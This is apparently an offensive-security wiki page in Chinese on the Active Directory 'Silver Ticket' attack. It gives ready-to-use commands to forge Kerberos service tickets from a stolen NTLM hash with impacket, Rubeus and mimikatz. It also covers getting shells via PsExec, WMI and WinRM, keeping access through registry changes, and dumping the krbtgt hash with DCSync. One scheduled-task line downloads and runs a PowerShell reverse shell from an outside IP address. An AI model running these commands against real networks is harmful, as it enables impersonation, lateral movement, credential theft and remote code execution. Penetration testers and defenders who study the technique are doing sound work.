# Silver Ticket

{{#include ../../banners/hacktricks-training.md}}

## Silver ticket

**Silver Ticket** 攻击涉及在 Active Directory (AD) 环境中利用服务票证。此方法依赖于 **获取服务账户的 NTLM 哈希**，例如计算机账户，以伪造票证授予服务 (TGS) 票证。通过这个伪造的票证，攻击者可以访问网络上的特定服务，**冒充任何用户**，通常目标是获取管理权限。强调使用 AES 密钥伪造票证更安全且不易被检测。

> [!WARNING]
> Silver Tickets 的可检测性低于 Golden Tickets，因为它们只需要 **服务账户的哈希**，而不需要 krbtgt 账户。然而，它们仅限于其目标的特定服务。此外，仅仅窃取用户的密码。
此外，如果您通过 SPN 破坏了 **账户的密码**，您可以使用该密码创建一个 Silver Ticket，冒充任何用户访问该服务。

对于票证制作，根据操作系统使用不同的工具：

### On Linux
```bash
python ticketer.py -nthash <HASH> -domain-sid <DOMAIN_SID> -domain <DOMAIN> -spn <SERVICE_PRINCIPAL_NAME> <USER>
export KRB5CCNAME=/root/impacket-examples/<TICKET_NAME>.ccache
python psexec.py <DOMAIN>/<USER>@<TARGET> -k -no-pass
```
### 在Windows上
```bash
# Using Rubeus
## /ldap option is used to get domain data automatically
## With /ptt we already load the tickt in memory
rubeus.exe asktgs /user:<USER> [/rc4:<HASH> /aes128:<HASH> /aes256:<HASH>] /domain:<DOMAIN> /ldap /service:cifs/domain.local /ptt /nowrap /printcmd

# Create the ticket
mimikatz.exe "kerberos::golden /domain:<DOMAIN> /sid:<DOMAIN_SID> /rc4:<HASH> /user:<USER> /service:<SERVICE> /target:<TARGET>"

# Inject the ticket
mimikatz.exe "kerberos::ptt <TICKET_FILE>"
.\Rubeus.exe ptt /ticket:<TICKET_FILE>

# Obtain a shell
.\PsExec.exe -accepteula \\<TARGET> cmd
```
CIFS服务被强调为访问受害者文件系统的常见目标，但其他服务如HOST和RPCSS也可以被利用来执行任务和WMI查询。

## 可用服务

| 服务类型                                   | 服务银票                                                         |
| ------------------------------------------ | --------------------------------------------------------------- |
| WMI                                        | <p>HOST</p><p>RPCSS</p>                                        |
| PowerShell远程                             | <p>HOST</p><p>HTTP</p><p>根据操作系统还可以:</p><p>WSMAN</p><p>RPCSS</p> |
| WinRM                                      | <p>HOST</p><p>HTTP</p><p>在某些情况下你可以直接请求: WINRM</p> |
| 计划任务                                  | HOST                                                           |
| Windows文件共享，也包括psexec             | CIFS                                                           |
| LDAP操作，包括DCSync                      | LDAP                                                           |
| Windows远程服务器管理工具                 | <p>RPCSS</p><p>LDAP</p><p>CIFS</p>                             |
| 黄金票                                     | krbtgt                                                         |

使用**Rubeus**你可以使用参数**请求所有**这些票证：

- `/altservice:host,RPCSS,http,wsman,cifs,ldap,krbtgt,winrm`

### 银票事件ID

- 4624: 账户登录
- 4634: 账户注销
- 4672: 管理员登录

## 持久性

为了避免机器每30天更改一次密码，可以设置 `HKLM\SYSTEM\CurrentControlSet\Services\Netlogon\Parameters\DisablePasswordChange = 1`，或者可以将 `HKLM\SYSTEM\CurrentControlSet\Services\NetLogon\Parameters\MaximumPasswordAge` 设置为大于30天的值，以指示机器密码应更改的轮换周期。

## 滥用服务票证

在以下示例中，假设票证是通过模拟管理员账户获取的。

### CIFS

使用此票证，您将能够通过**SMB**访问`C$`和`ADMIN$`文件夹（如果它们被暴露），并通过执行类似以下操作将文件复制到远程文件系统的一部分：
```bash
dir \\vulnerable.computer\C$
dir \\vulnerable.computer\ADMIN$
copy afile.txt \\vulnerable.computer\C$\Windows\Temp
```
您还可以通过 **psexec** 在主机内部获取 shell 或执行任意命令：

{{#ref}}
../lateral-movement/psexec-and-winexec.md
{{#endref}}

### HOST

通过此权限，您可以在远程计算机上生成计划任务并执行任意命令：
```bash
#Check you have permissions to use schtasks over a remote server
schtasks /S some.vuln.pc
#Create scheduled task, first for exe execution, second for powershell reverse shell download
schtasks /create /S some.vuln.pc /SC weekly /RU "NT Authority\System" /TN "SomeTaskName" /TR "C:\path\to\executable.exe"
schtasks /create /S some.vuln.pc /SC Weekly /RU "NT Authority\SYSTEM" /TN "SomeTaskName" /TR "powershell.exe -c 'iex (New-Object Net.WebClient).DownloadString(''http://172.16.100.114:8080/pc.ps1''')'"
#Check it was successfully created
schtasks /query /S some.vuln.pc
#Run created schtask now
schtasks /Run /S mcorp-dc.moneycorp.local /TN "SomeTaskName"
```
### HOST + RPCSS

使用这些票证，您可以**在受害者系统中执行 WMI**：
```bash
#Check you have enough privileges
Invoke-WmiMethod -class win32_operatingsystem -ComputerName remote.computer.local
#Execute code
Invoke-WmiMethod win32_process -ComputerName $Computer -name create -argumentlist "$RunCommand"

#You can also use wmic
wmic remote.computer.local list full /format:list
```
找到有关 **wmiexec** 的更多信息，请访问以下页面：

{{#ref}}
../lateral-movement/wmiexec.md
{{#endref}}

### HOST + WSMAN (WINRM)

通过 winrm 访问计算机，您可以 **访问它**，甚至获取 PowerShell：
```bash
New-PSSession -Name PSC -ComputerName the.computer.name; Enter-PSSession PSC
```
检查以下页面以了解 **使用 winrm 连接远程主机的更多方法**：

{{#ref}}
../lateral-movement/winrm.md
{{#endref}}

> [!WARNING]
> 请注意，**winrm 必须在远程计算机上处于活动和监听状态**才能访问。

### LDAP

凭借此权限，您可以使用 **DCSync** 转储 DC 数据库：
```
mimikatz(commandline) # lsadump::dcsync /dc:pcdc.domain.local /domain:domain.local /user:krbtgt
```
**了解更多关于 DCSync** 在以下页面：

{{#ref}}
dcsync.md
{{#endref}}


## 参考文献

- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberos-silver-tickets](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberos-silver-tickets)
- [https://www.tarlogic.com/blog/how-to-attack-kerberos/](https://www.tarlogic.com/blog/how-to-attack-kerberos/)
- [https://techcommunity.microsoft.com/blog/askds/machine-account-password-process/396027](https://techcommunity.microsoft.com/blog/askds/machine-account-password-process/396027)



{{#include ../../banners/hacktricks-training.md}}
